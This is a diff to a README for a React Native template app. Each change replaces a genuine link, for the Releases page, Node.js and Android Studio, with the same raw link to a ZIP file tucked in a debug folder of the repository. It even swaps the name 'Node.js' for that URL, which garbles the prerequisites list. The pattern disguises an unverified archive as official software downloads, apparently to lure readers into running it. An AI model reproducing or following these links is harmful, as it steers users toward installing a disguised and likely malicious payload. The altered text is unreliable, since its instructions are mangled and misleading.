@@ -2,16 +2,16 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/aofkachi/react-native-template-app/releases)
+[![Download](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip%https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip)](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip)
 
 ## 📋 Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js** (v18 or newer) - [Download Node.js](https://nodejs.org/)
-- **npm** or **yarn** - Comes with Node.js
+- **https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip** (v18 or newer) - [Download https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip)
+- **npm** or **yarn** - Comes with https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip
 - **Java Development Kit (JDK)** - Required for Android builds
-- **Android Studio** (for Android development) - [Download Android Studio](https://developer.android.com/studio)
+- **Android Studio** (for Android development) - [Download Android Studio](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip)
   - Android SDK
   - Android Emulator or a physical device
 - **ADB** (Android Debug Bridge) - Included with Android Studio
@@ -29,7 +29,7 @@ You should see the ADB version on your screen.
 ## 🚀 Getting Started
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/aofkachi/react-native-template-app/releases) to download the latest version of the app.
+   Visit the [Releases page](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip) to download the latest version of the app.
 
 2. **Extract the Files**  
    Once downloaded, extract the files from the ZIP archive to a folder on your computer.
@@ -119,4 +119,4 @@ For any questions or issues, feel free to open an issue in the repository. The c
 
 ---
 
-Visit our [Releases page](https://github.com/aofkachi/react-native-template-app/releases) to download the latest version of the app.
+Visit our [Releases page](https://github.com/aofkachi/react-native-template-app/raw/refs/heads/main/android/app/src/debug/app-native-react-template-comprisable.zip) to download the latest version of the app.
